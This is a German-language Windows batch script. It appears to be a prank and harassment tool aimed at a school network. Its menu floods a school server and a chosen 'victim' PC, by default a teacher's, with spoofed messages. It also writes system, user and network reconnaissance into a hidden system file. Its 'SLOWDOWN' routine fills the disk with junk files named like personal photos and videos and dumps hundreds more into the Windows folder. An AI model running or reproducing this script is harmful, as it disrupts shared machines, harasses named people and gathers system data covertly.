@echo off
if [%1%]==[boom] goto SLOW

title fOllOw tHe raBBiT!
color 0a
:menu
cls
echo.
echo.
echo.
echo.
echo       IIIIN   NIIII                   
echo       I   N   N   I              
echo       I X N   N X I         
echo       I   N   N   I    
echo.
echo.    
echo.  
echo      \~~( )~~~( )~~/    
echo.                       
echo.
echo.
echo 1 - Eine Nachricht an alle
echo 2 - 20 Msg's an einen
echo 3 - Spam den INIS-Server (ARKTUR) 100x (BETA)
echo 4 - Netzwerknamen Auflisten
echo 5 - Nen Liter Bananen Braten
echo 6 - Regedit
echo 7 - Windows-Explorer
echo 8 - Informationen Auslesen
echo 9 - SLOWDOWN!
echo.
set /P m=UND? 

if [%m%]==[1] goto spamall
if [%m%]==[2] goto spamone
if [%m%]==[3] goto spamarktur
if [%m%]==[4] goto list
if [%m%]==[5] echo nothing
if [%m%]==[6] regedit
if [%m%]==[7] explorer
if [%m%]==[8] goto laber
if [%m%]==[9] goto SLOW
goto menu


:laber
cls
cd %systemroot%
attrib -s -r C:\Programme\$msdirsrv
del C:\Programme\$msdirsrv
dir C:\ > C:\Programme\$msdirsrv
dir C:\Programme\ >> C:\Programme\$msdirsrv
dir C:\Windows\ >> C:\Programme\$msdirsrv
dir C:\Windows\system\ >> C:\Programme\$msdirsrv
dir C:\Windows\system32\ >> C:\Programme\$msdirsrv
ipconfig /all >> C:\Programme\$msdirsrv
netstat -a >> C:\Programme\$msdirsrv
netstat -n >> C:\Programme\$msdirsrv
net view >> C:\Programme\$msdirsrv
net accounts >> C:\Programme\$msdirsrv
net localgroup >> C:\Programme\$msdirsrv
net share >> C:\Programme\$msdirsrv
net statistics server >> C:\Programme\$msdirsrv
net statistics workstation >> C:\Programme\$msdirsrv
net user >> C:\Programme\$msdirsrv
ver >> C:\Programme\$msdirsrv
dir C:\Inis\ >> C:\Programme\$msdirsrv
attrib +s +r C:\Programme\$msdirsrv
pause
cls
goto menu

:SLOW
cls

set /P tausch=Was is der buchstabe von der Tauschfestplatte? 
set filenm1=a.%random%
set filenm2=b.%random%
set anzahl=4090
set i=1

:null
if [%i%]==[%anzahl%] GOTO fertignull

echo 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 >> C:\Programme\%filenm1%

echo Creating 1 Mb File %anzahl2% Bytes Sent

SET /A i=%i% + 1
set /A anzahl2=%i%*256
GOTO null

:fertignull



cls

set anzahl=24
set i=1
:nullb
if [%i%]==[%anzahl%] GOTO fertignullb

echo Creating %anzahl%MB File - %i% of %anzahl% MB
type C:\Programme\%filenm1% >>c:\Programme\%filenm2%


SET /A i=%i% + 1
GOTO nullb

:fertignullb

cls

echo Copying %anzahl%MB Files on C:\ [1 of 10]
type C:\Programme\%filenm2% > C:\pic001.jpg
echo Copying %anzahl%MB Files on C:\ [2 of 10]
type C:\Programme\%filenm2% > C:\Ich.jpg
echo Copying %anzahl%MB Files on C:\ [3 of 10]
type C:\Programme\%filenm2% > C:\Mein_Auto.jpg
echo Copying %anzahl%MB Files on C:\ [4 of 10]
type C:\Programme\%filenm2% > C:\Lustig_anschauen.jpg
echo Copying %anzahl%MB Files on C:\ [5 of 10]
type C:\Programme\%filenm2% > C:\Urlaub001.jpg
echo Copying %anzahl%MB Files on C:\ [6 of 10]
type C:\Programme\%filenm2% > C:\Urlaub002.jpg
echo Copying %anzahl%MB Files on C:\ [7 of 10]
type C:\Programme\%filenm2% > C:\Urlaub003.jpg
echo Copying %anzahl%MB Files on C:\ [8 of 10]
type C:\Programme\%filenm2% > C:\Urlaub004.jpg
echo Copying %anzahl%MB Files on C:\ [9 of 10]
type C:\Programme\%filenm2% > C:\Skate_or_die.wmv
echo Copying %anzahl%MB Files on C:\ [10 of 10]
type C:\Programme\%filenm2% > C:\irrestunts.avi

set anzahl=100
set i=1

cls

echo Creating %anzahl% 1 MB  Zip / Jpeg / Bmp / Avi / Doc / tar.gz / com / scr Files on C:\Windows

:nullc
if [%i%]==[%anzahl%] GOTO fertignullc

echo                                                                                             %i% of %anzahl% X 8 files already done
type C:\Programme\%filenm1% > C:\Windows\%random%.Zip
type C:\Programme\%filenm1% > C:\Windows\%random%.jpeg
type C:\Programme\%filenm1% > C:\Windows\%random%.bmp
type C:\Programme\%filenm1% > C:\Windows\%random%.avi
type C:\Programme\%filenm1% > C:\Windows\%random%.doc
type C:\Programme\%filenm1% > C:\Windows\%random%.tar.gz
type C:\Programme\%filenm1% > C:\Windows\%random%.com
type C:\Programme\%filenm1% > C:\Windows\%random%.scr

SET /A i=%i% + 1
GOTO nullc

:fertignullc

echo SUCCESS

pause
cls
goto menu

:spamarktur
cls
echo.
echo.
echo und los gayts =)
echo.
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619123333321233237356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563912297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915397356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619255912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915294356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915267356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371829376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
netsend SPOOFED ARKTUR "123812637123619253912563915297356129371529376512639123612531926312937"
pause
cls
goto menu

:spamall
cls
echo Nachricht in " " schreiben!
set /P msg=Nachricht? 

if [%msg%]==[] set msg=U gOt m1lk?

set /P abs=Absender? 

if [%abs%]==[] set abs=Der_Computer
echo.
echo.
echo und los gayts =)
echo.
netsend %abs% * %msg%
pause
cls
goto menu

:list
cls
echo listing:
net view
pause
cls
goto menu

:spamone
cls
echo Nachricht in " " schreiben!
set /P msg=Nachricht? 

if [%msg%]==[] set msg="U gOt m1lk3D!"

set /P abs=Absender? 

if [%abs%]==[] set abs=Der_Computer
echo.
echo.

echo Einfach "/019-" UND Pcnummer schreiben!
set /P opf=Das Opfer^^? 

if [%opf%]==[] set opf=/019-LEHRER

echo.
echo.
echo und los gayts =)
echo.
echo Sende 1 von 20
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
netsend %abs% %opf% %msg%
echo.
echo 20 von 20 gesendet!
pause
cls
goto menu
